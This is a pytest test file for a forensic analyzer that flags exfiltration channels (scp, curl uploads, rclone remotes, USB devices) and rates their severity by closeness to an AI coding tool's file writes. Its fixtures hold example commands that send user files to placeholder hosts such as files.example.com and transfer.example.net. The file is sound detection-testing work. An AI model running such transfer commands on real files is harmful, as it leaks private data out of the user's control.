from __future__ import annotations

from collections.abc import Iterator
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest

from aitrace.analyzers.exfil_channels import ANALYZER, USB_LIMITATION
from aitrace.core.ids import make_id
from aitrace.core.kinds import Actor, ArtifactKind, EventCategory, FindingCategory, Severity
from aitrace.core.model import Artifact, Event, Finding, Provenance
from aitrace.db.store import CaseStore

T0 = datetime(2026, 10, 1, 1, 0, 0, tzinfo=UTC)
PROPOSAL = "/Users/kim/work/proposal.md"
SCP_PROPOSAL = f"scp {PROPOSAL} kim@files.example.com:/tmp/"


def _art(aid: str, kind: ArtifactKind, data: dict[str, Any]) -> Artifact:
    return Artifact(
        id=aid,
        kind=kind,
        provenance=Provenance(evidence_id="ev", volume=0, source_path="/src", plugin="p", plugin_version="1.0"),
        data=data,
        user="kim",
    )


def _event(
    aid: str,
    ts: datetime,
    category: EventCategory = EventCategory.AI_ACTIVITY,
    actor: Actor = Actor.AI,
) -> Event:
    return Event(
        id=make_id("e", aid),
        artifact_id=aid,
        ts_utc=ts,
        ts_kind="k",
        ts_basis="native_utc",
        category=category,
        actor=actor,
        user="kim",
        summary="s",
    )


def _ai_write(aid: str, path: str, ts: datetime) -> list[Artifact | Event]:
    data: dict[str, Any] = {
        "tool": "Claude Code",
        "session_id": "s",
        "call_name": "Write",
        "input": {},
        "file_path": path,
    }
    return [_art(aid, ArtifactKind.AI_TOOL_CALL, data), _event(aid, ts)]


def _shell(aid: str, command: str, ts: datetime) -> list[Artifact | Event]:
    data: dict[str, Any] = {"shell": "bash", "command": command, "tags": ["transfer"], "rule_ids": ["TR-SCP"]}
    return [
        _art(aid, ArtifactKind.SHELL_COMMAND, data),
        _event(aid, ts, category=EventCategory.EXECUTION, actor=Actor.HUMAN),
    ]


@pytest.fixture
def store(tmp_path: Path) -> Iterator[CaseStore]:
    s = CaseStore(tmp_path / "case.sqlite")
    yield s
    s.close()


def _findings(store: CaseStore) -> list[Finding]:
    return [r for r in ANALYZER.run(store, "UTC") if isinstance(r, Finding)]


def test_scp_of_ai_written_file_is_high(store: CaseStore) -> None:
    store.add(
        [
            *_ai_write("tc1", PROPOSAL, T0),
            *_shell("sh1", SCP_PROPOSAL, T0 + timedelta(hours=3)),
        ]
    )
    findings = _findings(store)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.category is FindingCategory.EXFIL_CHANNEL
    assert finding.severity is Severity.HIGH
    assert finding.rule_id == "TR-SCP"
    assert finding.title == "Exfiltration channel: TR-SCP to files.example.com"
    assert finding.data["channel"] == "TR-SCP to files.example.com"
    assert finding.data["destination"] == "files.example.com"
    assert finding.data["actor"] == Actor.HUMAN.value
    assert PROPOSAL in finding.narrative
    assert "files.example.com" in finding.narrative
    assert "AI tool call targeted" in finding.narrative


def test_usb_insert_without_files_is_medium_with_copy_limitation(store: CaseStore) -> None:
    store.add(
        [
            _art(
                "usb1",
                ArtifactKind.USB_DEVICE,
                {"vendor": "Kingston", "product": "DataTraveler", "serial": "X1", "source": "setupapi"},
            ),
            _event("usb1", T0, category=EventCategory.DEVICE, actor=Actor.SYSTEM),
        ]
    )
    findings = _findings(store)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.category is FindingCategory.EXFIL_CHANNEL
    assert finding.severity is Severity.MEDIUM
    assert finding.rule_id == "EXFIL-USB"
    assert finding.data["channel"] == "USB Kingston DataTraveler"
    assert USB_LIMITATION in finding.limitations


@pytest.mark.parametrize(
    ("minutes", "expected"),
    [(30, Severity.HIGH), (90, Severity.MEDIUM)],
)
def test_transfer_severity_follows_60_minute_ai_window(
    store: CaseStore, minutes: int, expected: Severity
) -> None:
    store.add(
        [
            *_ai_write("tc1", "/Users/kim/work/other.md", T0),
            *_shell(
                "sh1",
                "scp /Users/kim/Desktop/notes.txt kim@files.example.com:/tmp/",
                T0 + timedelta(minutes=minutes),
            ),
        ]
    )
    findings = _findings(store)
    assert len(findings) == 1
    assert findings[0].severity is expected


def test_cloud_sync_finding_names_the_rclone_remote(store: CaseStore) -> None:
    store.add(
        [
            _art(
                "cs1",
                ArtifactKind.CLOUD_SYNC,
                {"service": "drive", "account": "gdrive", "extra": {"tool": "rclone", "remote_name": "gdrive"}},
            ),
            _event("cs1", T0, category=EventCategory.CONFIG, actor=Actor.UNKNOWN),
        ]
    )
    (finding,) = _findings(store)
    assert finding.title == "Exfiltration channel: rclone remote gdrive (drive)"
    assert "gdrive" in finding.data["channel"]
    assert "gdrive" in finding.data["destination"]
    assert "gdrive" in finding.narrative


def test_same_channel_from_two_artifacts_yields_one_finding(store: CaseStore) -> None:
    command = "curl -T /home/park/a.zip https://transfer.example.net/upload"
    store.add([*_shell("sh1", command, T0), *_shell("sh2", command, T0 + timedelta(minutes=1))])
    findings = _findings(store)
    assert len(findings) == 1
    assert set(findings[0].artifact_ids) == {"sh1", "sh2"}
    assert len(findings[0].event_ids) == 2


def test_shell_command_and_derived_file_transfer_yield_one_finding(store: CaseStore) -> None:
    command = r"rclone copy C:\Users\kim\work gdrive:backup"
    transfer = _art(
        "ft1",
        ArtifactKind.FILE_TRANSFER,
        {
            "channel": "TR-RCLONE",
            "direction": "upload",
            "local_paths": [r"C:\Users\kim\work"],
            "destination": "gdrive:backup",
            "command": command,
        },
    )
    store.add(
        [
            *_shell("sh1", command, T0),
            transfer,
            _event("ft1", T0, category=EventCategory.TRANSFER, actor=Actor.HUMAN),
        ]
    )
    findings = _findings(store)
    assert len(findings) == 1
    assert findings[0].title == "Exfiltration channel: TR-RCLONE to gdrive:backup"
    assert set(findings[0].artifact_ids) == {"sh1", "ft1"}


def _good_records() -> list[Artifact | Event]:
    return _shell("s1", SCP_PROPOSAL, T0)


def _bad_records() -> list[Artifact | Event]:
    return [
        _art("bad-missing", ArtifactKind.SHELL_COMMAND, {"shell": "bash", "tags": [], "rule_ids": []}),
        _art("bad-type", ArtifactKind.SHELL_COMMAND, {"shell": "bash", "command": 42}),
    ]



def test_malformed_artifacts_are_skipped_and_reported(store: CaseStore) -> None:
    store.add(_good_records())
    baseline = list(ANALYZER.run(store, "UTC"))
    assert not [f for f in baseline if isinstance(f, Finding) and f.category is FindingCategory.COVERAGE]

    store.add(_bad_records())
    result = list(ANALYZER.run(store, "UTC"))  # must not raise

    coverage = [f for f in result if isinstance(f, Finding) and f.category is FindingCategory.COVERAGE]
    assert [item for item in result if item not in coverage] == baseline
    assert len(coverage) == 1
    assert coverage[0].severity is Severity.LOW
    assert coverage[0].title == "exfil_channels: skipped 2 malformed artifacts"
    assert coverage[0].data["artifact_ids"] == ["bad-missing", "bad-type"]
